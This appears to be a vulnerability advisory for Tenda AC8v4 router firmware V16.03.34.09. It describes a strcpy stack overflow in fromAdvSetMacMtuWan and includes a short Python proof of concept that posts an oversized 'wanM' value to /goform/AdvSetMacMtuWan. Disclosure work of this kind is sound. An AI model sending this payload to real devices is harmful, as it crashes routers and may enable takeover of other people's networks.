## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3683.html

## Affected version

AC8v4 V16.03.34.09

## Vulnerability details

The Tenda AC8v4 V16.03.34.09 firmware has a stack overflow vulnerability in the `fromAdvSetMacMtuWan` function. In the function `sub_458FBC`, the `v4, v5, v6, v7, v8, v9` variable receives the `wanMTU, wanSpeed, cloneType, mac, serviceName, serverName` parameter from a POST request and is later assigned to the function `strcpy`, which can cause a buffer overflow. The user-provided  parameters can exceed the capacity of the `a3` array, triggering this security vulnerability.

![image-20240415133939372](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415133939372.png)

![image-20240415134045910](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415134045910.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/AdvSetMacMtuWan"
payload = "a"*1000

data = {"wanM": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)
